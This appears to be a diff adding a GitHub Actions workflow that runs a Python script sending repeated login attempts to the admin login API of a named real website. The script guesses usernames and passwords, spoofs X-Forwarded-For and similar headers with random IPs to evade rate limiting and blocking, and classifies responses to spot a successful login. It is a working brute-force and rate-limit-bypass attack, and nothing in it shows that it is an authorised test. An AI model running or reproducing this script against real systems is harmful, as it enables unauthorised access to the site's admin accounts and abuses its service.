@@ -1,0 +1,64 @@
+name: probe4
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  p:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: probe4
+        run: |
+          cat > /tmp/probe4.py <<'PYEOF'
+          import json,time,random,urllib.request,urllib.error
+          URL="https://www.kufaka.com/adminApi/auth/login"
+          UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"
+          USERS=["admin","administrator","root","firstwxx","firstwxx1","19022075515","xgift","cddznsn"]
+          WORDS=["zzqx%d"%i for i in range(16)]
+          AJ={"Referer":"https://www.kufaka.com/package/admin/","Origin":"https://www.kufaka.com","Accept":"application/json, text/plain, */*"}
+          rng=random.Random(424242)
+          def rip(): return "%d.%d.%d.%d"%(rng.randint(1,223),rng.randint(0,255),rng.randint(0,255),rng.randint(1,254))
+          def one(user,pw,hdr):
+              body=json.dumps({"username":user,"password":pw}).encode()
+              r=urllib.request.Request(URL,data=body,method="POST")
+              r.add_header("Content-Type","application/json"); r.add_header("User-Agent",UA)
+              for k,v in AJ.items(): r.add_header(k,v)
+              for k,v in hdr.items(): r.add_header(k,v)
+              try:
+                  resp=urllib.request.urlopen(r,timeout=25); st=resp.status; b=resp.read().decode("utf-8","ignore"); ps=resp.headers.get("proxy-status","")
+              except urllib.error.HTTPError as e:
+                  st=e.code; ps=e.headers.get("proxy-status","")
+                  try: b=e.read().decode("utf-8","ignore")
+                  except Exception: b=""
+              except Exception as e:
+                  return -1,"exc",type(e).__name__+"", ""
+              if "用户名或密码不正确" in b: cat="real"
+              elif "操作频繁" in b: cat="rl"
+              elif "访问已被拦截" in b: cat="blk"
+              elif st==520 and not b: cat="520"
+              elif ("token" in b.lower() and "用户名或密码不正确" not in b): cat="hit"
+              else: cat="other"
+              return st,cat,b[:150],ps
+          cnt={}; n=0
+          # A) XFF-only (single header) 16 words x 8 users
+          for w in WORDS:
+              for u in USERS:
+                  ip=rip()
+                  st,cat,b,ps=one(u,w,{"X-Forwarded-For":ip})
+                  cnt[cat]=cnt.get(cat,0)+1; n+=1
+                  print("A n=%d user=%s word=%s st=%s cat=%s len=%d ps=%s b=%r"%(n,u,w,st,cat,len(b),ps,b),flush=True)
+                  time.sleep(0.9)
+          print("A_DONE total=%d counts=%s real_ratio=%.3f"%(n,json.dumps(cnt),cnt.get("real",0)/max(n,1)),flush=True)
+          # B) trio-header diagnostic (4 samples)
+          cn2={}
+          for i in range(4):
+              ip=rip()
+              st,cat,b,ps=one("admin","trio%d"%i,{"X-Forwarded-For":ip,"CF-Connecting-IP":ip,"X-Real-IP":ip})
+              cn2[cat]=cn2.get(cat,0)+1
+              print("B i=%d st=%s cat=%s len=%d ps=%s b=%r"%(i,st,cat,len(b),ps,b),flush=True)
+              time.sleep(0.9)
+          print("B_DONE counts=%s"%json.dumps(cn2),flush=True)
+          print("FINAL counts_A=%s counts_B=%s"%(json.dumps(cnt),json.dumps(cn2)),flush=True)
+          PYEOF
+          python3 /tmp/probe4.py
